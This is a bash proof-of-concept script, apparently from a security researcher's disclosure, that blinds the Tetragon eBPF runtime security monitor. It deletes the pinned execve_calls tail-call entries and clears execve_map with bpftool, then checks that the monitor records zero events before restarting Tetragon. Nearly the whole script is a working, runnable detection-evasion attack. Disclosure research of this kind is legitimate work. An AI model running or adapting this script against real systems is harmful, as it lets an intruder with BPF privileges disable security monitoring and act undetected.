#!/bin/bash
# BPF Map Poisoning PoC: Total Tetragon Blindness
# Researcher: Azizcan Daştan — Milenium Security
# Date: 2026-05-27
#
# Demonstrates complete evasion of Tetragon (cilium/tetragon) by:
#   1. Deleting execve_calls prog_array entries (breaks exec event tail calls)
#   2. Clearing execve_map (makes all processes invisible to all sensors)
#
# Tetragon pins ALL maps to /sys/fs/bpf/tetragon/ — predictable, directly accessible.
#
# Requirements:
#   - Linux kernel 5.8+ with BPF support
#   - CAP_BPF or CAP_SYS_ADMIN
#   - bpftool, python3, Docker

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

CONTAINER="tetragon-poc-test"

log()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()   { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }

cleanup() {
    log "Cleaning up..."
    docker rm -f "$CONTAINER" 2>/dev/null || true
}

capture_events() {
    local output_file=$1
    local duration=$2
    docker exec "$CONTAINER" tetra getevents -o json > "$output_file" 2>/dev/null &
    local pid=$!
    sleep 1
    generate_activity
    sleep "$duration"
    kill $pid 2>/dev/null
    wait $pid 2>/dev/null
}

generate_activity() {
    /bin/ls /etc/shadow > /dev/null 2>&1 || true
    /usr/bin/whoami > /dev/null 2>&1
    /usr/bin/id > /dev/null 2>&1
    /bin/cat /etc/passwd > /dev/null 2>&1
    /bin/bash -c "echo test" > /dev/null 2>&1
    /bin/ps aux > /dev/null 2>&1
    /usr/bin/find /tmp -maxdepth 1 > /dev/null 2>&1
}

count_exec_events() {
    grep -c "process_exec" "$1" 2>/dev/null || echo "0"
}

count_total_events() {
    wc -l < "$1" 2>/dev/null || echo "0"
}

echo ""
echo "============================================================"
echo "  BPF Map Poisoning PoC: Total Tetragon Blindness"
echo "  Researcher: Azizcan Daştan — Milenium Security"
echo "============================================================"
echo ""

# Phase 0: Setup
log "Starting Tetragon container..."
docker rm -f "$CONTAINER" 2>/dev/null || true
docker run -d --name "$CONTAINER" \
    --privileged \
    --pid=host \
    -v /sys/kernel/btf:/sys/kernel/btf:ro \
    -v /sys/kernel/debug:/sys/kernel/debug \
    -v /sys/fs/bpf:/sys/fs/bpf \
    -v /lib/modules:/lib/modules:ro \
    quay.io/cilium/tetragon:v1.4.0 2>/dev/null

log "Waiting for Tetragon to initialize (15s)..."
sleep 15

# Phase 1: Verify pinned maps exist
log "Phase 1: Verifying pinned BPF maps..."
if [ ! -f /sys/fs/bpf/tetragon/execve_map ]; then
    fail "execve_map not found at /sys/fs/bpf/tetragon/execve_map"
    cleanup
    exit 1
fi

EXECVE_MAP_ENTRIES=$(bpftool map dump pinned /sys/fs/bpf/tetragon/execve_map -j | python3 -c 'import json,sys;print(len(json.load(sys.stdin)))')
EXECVE_CALLS_ENTRIES=$(bpftool map dump pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls -j 2>/dev/null | python3 -c 'import json,sys;print(len(json.load(sys.stdin)))' 2>/dev/null || echo "0")

ok "Pinned maps found:"
ok "  execve_map: $EXECVE_MAP_ENTRIES entries (process tracking)"
ok "  execve_calls: $EXECVE_CALLS_ENTRIES entries (tail call prog_array)"

# Phase 2: Baseline
log "Phase 2: Establishing baseline..."
capture_events /tmp/tetragon_baseline.json 4

BASELINE_EXEC=$(count_exec_events /tmp/tetragon_baseline.json)
BASELINE_TOTAL=$(count_total_events /tmp/tetragon_baseline.json)
ok "Baseline: $BASELINE_EXEC process_exec, $BASELINE_TOTAL total events"

if [ "$BASELINE_EXEC" -eq 0 ]; then
    fail "Tetragon not detecting exec events. Aborting."
    cleanup
    exit 1
fi

# Phase 3: POISON
echo ""
log "Phase 3: POISONING Tetragon maps..."

log "  Step 1: Deleting execve_calls tail call entries..."
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls key hex 00 00 00 00 2>/dev/null || true
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls key hex 01 00 00 00 2>/dev/null || true
ok "  execve_calls emptied (tail calls will fail silently)"

log "  Step 2: Clearing execve_map (all process entries)..."
DELETED=$(bpftool map dump pinned /sys/fs/bpf/tetragon/execve_map -j 2>/dev/null | python3 -c "
import json, sys, subprocess
data = json.load(sys.stdin)
count = 0
for entry in data:
    key = entry.get('key', [])
    key_hex = ' '.join((v.replace('0x','') if isinstance(v, str) else f'{v:02x}') for v in key)
    cmd = f'bpftool map delete pinned /sys/fs/bpf/tetragon/execve_map key hex {key_hex}'
    if subprocess.run(cmd, shell=True, capture_output=True).returncode == 0:
        count += 1
print(count)
")
ok "  Deleted $DELETED entries from execve_map"

# Phase 4: Blindness test
echo ""
log "Phase 4: Testing Tetragon blindness..."
capture_events /tmp/tetragon_poison.json 5

POISON_EXEC=$(count_exec_events /tmp/tetragon_poison.json)
POISON_TOTAL=$(count_total_events /tmp/tetragon_poison.json)

echo ""
echo "============================================================"
if [ "$POISON_TOTAL" -eq 0 ]; then
    ok "TOTAL BLINDNESS CONFIRMED!"
    ok "Tetragon detected ZERO events after BPF map poisoning."
    ok "Baseline: $BASELINE_EXEC exec / $BASELINE_TOTAL total events"
    ok "Poisoned: $POISON_EXEC exec / $POISON_TOTAL total events"
    echo ""
    ok "Attack vectors used:"
    ok "  1. execve_calls prog_array emptied (exec pipeline broken)"
    ok "  2. execve_map cleared (all processes invisible)"
    ok "  All maps pinned at /sys/fs/bpf/tetragon/ — zero enumeration needed"
elif [ "$POISON_EXEC" -eq 0 ]; then
    warn "Exec blindness confirmed ($POISON_TOTAL exit events leaked)"
else
    fail "Partial effect: $POISON_EXEC/$POISON_TOTAL events"
fi
echo "============================================================"

# Phase 5: Restore
echo ""
log "Phase 5: Restoring Tetragon (restart required)..."
docker restart "$CONTAINER" 2>/dev/null
sleep 12

capture_events /tmp/tetragon_restore.json 4
RESTORE_EXEC=$(count_exec_events /tmp/tetragon_restore.json)
if [ "$RESTORE_EXEC" -gt 0 ]; then
    ok "Tetragon recovered: $RESTORE_EXEC exec events after restart"
else
    warn "Tetragon did not recover"
fi

echo ""
echo "============================================================"
echo "  Summary"
echo "============================================================"
echo "  Baseline exec events:    $BASELINE_EXEC"
echo "  Post-poison exec events: $POISON_EXEC"
echo "  Post-poison total:       $POISON_TOTAL"
echo "  Post-restore exec:       $RESTORE_EXEC"
echo "  Attack surfaces:"
echo "    /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls"
echo "    /sys/fs/bpf/tetragon/execve_map"
echo "  Required capability:     CAP_BPF"
echo "============================================================"
echo ""

cleanup
